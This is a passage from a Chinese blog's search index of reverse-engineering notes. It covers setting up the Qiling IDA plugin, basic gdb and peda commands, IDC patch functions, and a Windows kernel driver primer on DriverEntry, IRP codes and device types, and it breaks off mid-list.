        <category>分析工具</category>
        <category>python</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>基本使用</title>
    <url>/2024/01/15/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/qiling%E6%A1%86%E6%9E%B6/qilingida/%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>参考<a class="link"   href="https://docs.qiling.io/en/latest/ida/" >IDAPro Plugin - Qiling Framework Documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在进行qiling框架搭建的过程中需要先进行setup</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151624593.png"
                      alt="image-20240115162436570"
                ></p>
<p>主要需要处理的就下面两处 其他可以直接为空</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151702214.png"
                      alt="image-20240115170252163"
                ></p>
<p>Rootfs path 在<a class="link"   href="https://github.com/qilingframework/qiling" >qilingframework&#x2F;qiling: A True Instrumentable Binary Emulation Framework (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个仓库内</p>
<p>需要进行<code>git clone —recursive https://github.com/qilingframework/qiling</code> —recursive的原因是因为有子模块需要导出</p>
<p>clone的仓库位置\examples\rootfs 存有很多的运行库此处以linux_8664为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151722456.png"
                      alt="image-20240115172208425"
                ></p>
<p>脚本需要自己编写，现在最简单的例子如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QILING_IDA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">custom_prepare</span>(<span class="params">self, ql</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">custom_continue</span>(<span class="params">self, ql:Qiling</span>):</span><br><span class="line">        hook = []</span><br><span class="line">        <span class="keyword">return</span> hook</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">custom_step</span>(<span class="params">self, ql:Qiling</span>):</span><br><span class="line">        hook = []</span><br><span class="line">        <span class="keyword">return</span> hook</span><br></pre></td></tr></table></figure></div>

<p>然后将这个脚本的位置写入Custom script path内即可</p>
<p>start后出现下列字符串代表加载成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151731290.png"
                      alt="image-20240115173124263"
                ></p>
<p>然后在左下角（下面的都是在这个地方输入）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151733330.png"
                      alt="image-20240115173347292"
                ></p>
<blockquote>
<p>输入下面的字符串,获取当前的ida qiling插件的对象</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import ida_ida</span><br><span class="line">ql_plugin = ida_ida.ql_plugin </span><br><span class="line">qlemu = ql_plugin.qlemu </span><br><span class="line">ql = qlemu.ql</span><br></pre></td></tr></table></figure></div>

<p>获取内存映射表</p>
<p><code>ql.mem.mapinfo</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151740267.png"
                      alt="image-20240115174012240"
                ></p>
<p>此处我的elf是qilinglab-x86_64(首地址是0x555555554000)</p>
<p>读取对应位置的内存信息</p>
<p><code>ql.mem.read(0x555555554000,10)</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151742247.png"
                      alt="image-20240115174208225"
                ></p>
<p>是正常的elf文件 且映射对的上文件头</p>
<p>因为ida插件的setpc存在问题（pc跟汇编中的eip作用一样）对自己要运行的指令进行setpc操作时地址不是对应的内存映射表的地址 也就是ra无法对应va所以需要手动更改基址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151745818.png"
                      alt="image-20240115174512766"
                ></p>
<p>输入刚刚内存映射表得到的elf首地址即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151745824.png"
                      alt="image-20240115174555798"
                ></p>
<p>在要运行的地方右键选择setpc即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151746153.png"
                      alt="image-20240115174630104"
                ></p>
<p>然后步入操作（step）直接输入ctrl+shift+f9即可</p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>qiling框架</category>
        <category>qilingida</category>
      </categories>
  </entry>
  <entry>
    <title>环境配置</title>
    <url>/2024/01/15/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/qiling%E6%A1%86%E6%9E%B6/qilingida/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>先需要安装python中的 qiling插件</p>
<p><code>pip install qiling</code></p>
<p>找到qiling安装位置</p>
<p><code>pip show qiling</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151551166.png"
                      alt="image-20240115155157099"
                ></p>
<p>访问location所指目录下的qiling文件夹，下面用用相对地址代指位置</p>
<p>qiling\extensions\idaplugin下的qilingida.py通过创建链接的操作放到ida目录下的plugins</p>
<p><code>mklink ida的plugins路径\qilingida.py qiling\extensions\idaplugin\qilingida.py</code></p>
<p>效果类似下面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151620095.png"
                      alt="image-20240115162015058"
                ></p>
<p>打开ida后出现这个即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202401151622063.png"
                      alt="image-20240115162202017"
                ></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>qiling框架</category>
        <category>qilingida</category>
      </categories>
  </entry>
  <entry>
    <title>gdb</title>
    <url>/2023/08/05/Re/windows/pe/x86/gdb/</url>
    <content><![CDATA[<h2 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h2><p>linux执行命令安装gdb</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">file #载入可执行文件</span><br><span class="line">start #停到程序入口点处</span><br><span class="line">run #运行程序，直到遇见断点</span><br><span class="line">step #步入</span><br><span class="line">next #步过</span><br><span class="line">c #继续，直到遇到下个断点或者输入</span><br><span class="line">b 函数名 #在函数处打断点，可能需要符号表</span><br><span class="line">b *地址 #在地址处打断点，</span><br><span class="line">x/类型 地址或寄存器 #x/s 0xfffff或者 x/s $rax斜杠后面的参数名可见下面参数列表，注意此处的*是起解引用的作用而不是指指针了</span><br><span class="line">set args 参数1 参数2 #设置参数，字符串可用双引号包裹</span><br></pre></td></tr></table></figure></div>

<p>db defined byte 字节型</p>
<p>dw defined word 字型，2字节</p>
<p>dd 双字型，4字节</p>
<p>dq 四字，8字节</p>
<p>s string</p>
<h2 id="peda安装"><a href="#peda安装" class="headerlink" title="peda安装"></a>peda安装</h2><p>安装peda</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda</span><br><span class="line">cd peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure></div>

<p>输入gdb验证peda是否安装成功(注意linux需要有python环境)</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb</span></span><br><span class="line">GNU gdb (Debian 13.2-1) 13.2</span><br><span class="line">Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line"><span class="meta prompt_">gdb-peda$</span></span><br></pre></td></tr></table></figure></div>

<h2 id="peda命令"><a href="#peda命令" class="headerlink" title="peda命令"></a>peda命令</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">peda.execute(<span class="string">&quot;命令&quot;</span>)<span class="comment">#执行对应的gdb命令</span></span><br><span class="line">peda.execute_redirect(<span class="string">&quot;命令&quot;</span>)<span class="comment">#执行命令并接受该命令返回值</span></span><br><span class="line">peda.set_breakpoint(<span class="string">&#x27;地址&#x27;</span>)<span class="comment">#设置断点</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>可用下面的来模拟输入操作</p>
<p>注意gdb中的重定向是&lt; &lt;中间会有个空格</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">peda.execute(&quot;run &lt; &lt;&quot; + &quot;(python3 -c &#x27;print(\&quot;&quot; + &#x27;&#x27;.join(参数) + &quot;\&quot;)&#x27;)&quot;)</span><br><span class="line">peda.execute(&quot;r &lt; &lt;(echo -e &#x27;&quot; + input_data.replace(&#x27;\n&#x27;, &#x27;\\n&#x27;) + &quot;&#x27;)&quot;)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
        <category>x86</category>
      </categories>
  </entry>
  <entry>
    <title>golang</title>
    <url>/2023/10/21/Re/windows/pe/x86/golang/</url>
    <content><![CDATA[<p>暂存</p>
<p>rax用于存放对应对象，或者对象传递位置 rbx及其它寄存器用于传递参数</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
        <category>x86</category>
      </categories>
  </entry>
  <entry>
    <title>idc</title>
    <url>/2023/09/07/Re/windows/pe/x86/idc/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PatchByte()<span class="comment">//一般都未类型名 可以为Byte(1字节) Word(2字节) Dword(4字节) Qword(8字节)</span></span><br><span class="line">Byte()<span class="comment">//一般都未类型名 可以为Byte(1字节) Word(2字节) Dword(4字节) Qword(8字节)</span></span><br><span class="line"></span><br><span class="line">Message<span class="comment">//用于打印到终端</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>windows</category>
        <category>pe</category>
        <category>x86</category>
      </categories>
  </entry>
  <entry>
    <title>驱动相关</title>
    <url>/2024/03/30/Re/windows/pe/%E9%A9%B1%E5%8A%A8/%E9%A9%B1%E5%8A%A8%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h1 id="sys"><a href="#sys" class="headerlink" title="sys"></a><strong>sys</strong></h1><blockquote>
<p>sys也可以认为是一种dll(动态链接库) 其entry_point实际上就是DriverEntry，只不过内部进行了相应的注册和一些函数回调绑定</p>
</blockquote>
<h2 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line">    <span class="comment">//下面为IRP请求包对应的不同行为,相当于程序与驱动之间的通讯部分进行的调用</span></span><br><span class="line">    <span class="comment">//绑定对应的行为，例如发生了IRP_MJ_CREATE操作就执行MyDriver_CreateClose</span></span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriver_CreateClose;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriver_CreateClose;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyDriver_ReadWrite;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyDriver_ReadWrite;</span><br><span class="line">	<span class="comment">//字符串转换</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;deviceNameUnicodeString, DEVICE_NAME);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;symbolicLinkUnicodeString, LINK_NAME);</span><br><span class="line">    <span class="comment">//定义见下面代码</span></span><br><span class="line">    NTSTATUS status = <span class="built_in">IoCreateDevice</span>(<span class="comment">//获取对应设备句柄</span></span><br><span class="line">        DriverObject,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;deviceNameUnicodeString,</span><br><span class="line">        FILE_DEVICE_UNKNOWN,</span><br><span class="line">        FILE_DEVICE_SECURE_OPEN,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;g_MyDeviceObject</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;symbolicLinkUnicodeString, &amp;deviceNameUnicodeString);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(g_MyDeviceObject);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="IoCreateDevice"><a href="#IoCreateDevice" class="headerlink" title="IoCreateDevice"></a><strong>IoCreateDevice</strong></h3><blockquote>
<p><a href="#DRIVER_OBJECT">PDRIVER_OBJECT</a> <a href="#DEVICE_TYPE">DEVICE_TYPE</a></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">[in]           PDRIVER_OBJECT  DriverObject,<span class="comment">//驱动对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">[in]           ULONG           DeviceExtensionSize,<span class="comment">//驱动需要的额外空间</span></span></span></span><br><span class="line"><span class="params"><span class="function">[in, optional] PUNICODE_STRING DeviceName,<span class="comment">//驱动名</span></span></span></span><br><span class="line"><span class="params"><span class="function">[in]           DEVICE_TYPE     DeviceType,<span class="comment">//驱动类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">[in]           ULONG           DeviceCharacteristics,<span class="comment">//</span></span></span></span><br><span class="line"><span class="params"><span class="function">[in]           BOOLEAN         Exclusive,<span class="comment">//</span></span></span></span><br><span class="line"><span class="params"><span class="function">[out]          PDEVICE_OBJECT  *DeviceObject<span class="comment">//输出对应的驱动对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
<h3 id="IoCreateSymbolicLink"><a href="#IoCreateSymbolicLink" class="headerlink" title="IoCreateSymbolicLink"></a>IoCreateSymbolicLink</h3><blockquote>
<p>用于创建跟device的链接，等效于device name(device name只能在内核中调用，所以在用户态调用时需要创建SymbolicLink)</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING DeviceName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></div>

</blockquote>
<h3 id="majorfunction"><a href="#majorfunction" class="headerlink" title="majorfunction"></a><strong>majorfunction</strong></h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">_Use_decl_annotations_</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">DispatchXxx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _DEVICE_OBJECT  *DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _IRP  *Irp</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// Function body</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="IRP结构"><a href="#IRP结构" class="headerlink" title="IRP结构"></a>IRP结构</h4><h4 id="IRP请求分类"><a href="#IRP请求分类" class="headerlink" title="IRP请求分类"></a><strong>IRP请求分类</strong></h4><blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>调用者</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>IRP_MJ_CREATE</td>
<td>请求句柄</td>
<td>CreateFile</td>
<td>0x00</td>
</tr>
<tr>
<td>IRP_MJ_CREATE_NAMED_PIPE</td>
<td></td>
<td></td>
<td>0x01</td>
</tr>
<tr>
<td>IRP_MJ_CLEANUP</td>
<td></td>
<td>CloseHandle</td>
<td>0x12</td>
</tr>
<tr>
<td>IRP_MJ_CLOSE</td>
<td>关闭句柄</td>
<td>CloseHandle</td>
<td>0x02</td>
</tr>
<tr>
<td>IRP_MJ_READ</td>
<td>从设备输入数据</td>
<td>ReadFile</td>
<td>0x03</td>
</tr>
<tr>
<td>IRP_MJ_WRITE</td>
<td>输出数据到设备</td>
<td>WriteFile</td>
<td>0x04</td>
</tr>
<tr>
<td>IRP_MJ_DEVICE_CONTROL</td>
<td>控制操作(利用IOCTL)</td>
<td>DeviceIoControl</td>
<td>0x0e</td>
</tr>
<tr>
<td>IRP_MJ_INTERNAL_DEVICE_CONTROL</td>
<td>控制操作(内核操作)</td>
<td></td>
<td>0x0f</td>
</tr>
<tr>
<td>IRP_MJ_QUERY_INFORMATION</td>
<td>得到文件的长度</td>
<td>GetFileSize</td>
<td>0x05</td>
</tr>
<tr>
<td>IRP_MJ_SET_INFORMATION</td>
<td>设置文件长度</td>
<td>SetFileSize</td>
<td>0x06</td>
</tr>
<tr>
<td>IRP_MJ_FLUSH_BUFFERS</td>
<td>写入或者丢弃缓冲区</td>
<td>FlushFileBuffers&#x2F;FlushConsoleInputBuffer&#x2F;PurgeComm</td>
<td>0x09</td>
</tr>
<tr>
<td>IRP_MJ_SHUTDOWN</td>
<td>系统关机</td>
<td>InitiateSystemShutdown</td>
<td>0x10</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                   0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE_NAMED_PIPE        0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                    0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_READ                     0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_WRITE                    0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_INFORMATION        0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_INFORMATION          0x06</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_EA                 0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_EA                   0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_FLUSH_BUFFERS            0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_VOLUME_INFORMATION 0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_VOLUME_INFORMATION   0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DIRECTORY_CONTROL        0x0c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_FILE_SYSTEM_CONTROL      0x0d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SHUTDOWN                 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_LOCK_CONTROL             0x11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLEANUP                  0x12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE_MAILSLOT          0x13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_SECURITY           0x14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_SECURITY             0x15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_POWER                    0x16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SYSTEM_CONTROL           0x17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CHANGE            0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_QUOTA              0x19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_QUOTA                0x1a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_PNP                      0x1b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_PNP_POWER                IRP_MJ_PNP      <span class="comment">// Obsolete....</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_MAXIMUM_FUNCTION         0x1b</span></span><br></pre></td></tr></table></figure></div>


</blockquote>
<h2 id="相关类型定义"><a href="#相关类型定义" class="headerlink" title="相关类型定义"></a>相关类型定义</h2><h3 id="DEVICE-TYPE"><a href="#DEVICE-TYPE" class="headerlink" title="DEVICE_TYPE"></a><span id="DEVICE_TYPE">DEVICE_TYPE</span></h3><blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_8042_PORT           0x00000027</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_ACPI                0x00000032</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_BATTERY             0x00000029</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_BEEP                0x00000001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_BUS_EXTENDER        0x0000002a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_CD_ROM              0x00000002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_CD_ROM_FILE_SYSTEM  0x00000003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_CHANGER             0x00000030</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_CONTROLLER          0x00000004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DATALINK            0x00000005</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DFS                 0x00000006</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DFS_FILE_SYSTEM     0x00000035</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DFS_VOLUME          0x00000036</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DISK                0x00000007</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DISK_FILE_SYSTEM    0x00000008</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_DVD                 0x00000033</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_FIPS                0x0000003a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_FULLSCREEN_VIDEO    0x00000034</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_INPORT_PORT         0x0000000a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_KEYBOARD            0x0000000b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_KS                  0x0000002f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_KSEC                0x00000039</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MAILSLOT            0x0000000c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MASS_STORAGE        0x0000002d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MIDI_IN             0x0000000d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MIDI_OUT            0x0000000e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MODEM               0x0000002b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MOUSE               0x0000000f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_MULTI_UNC_PROVIDER  0x00000010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_NAMED_PIPE          0x00000011</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_NETWORK             0x00000012</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_NETWORK_BROWSER     0x00000013</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_NETWORK_FILE_SYSTEM 0x00000014</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_NETWORK_REDIRECTOR  0x00000028</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_NULL                0x00000015</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_PARALLEL_PORT       0x00000016</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_PHYSICAL_NETCARD    0x00000017</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_PRINTER             0x00000018</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SCANNER             0x00000019</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SCREEN              0x0000001c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SERENUM             0x00000037</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SERIAL_MOUSE_PORT   0x0000001a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SERIAL_PORT         0x0000001b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SMARTCARD           0x00000031</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SMB                 0x0000002e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_SOUND               0x0000001d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_DEVICE_STREAMS             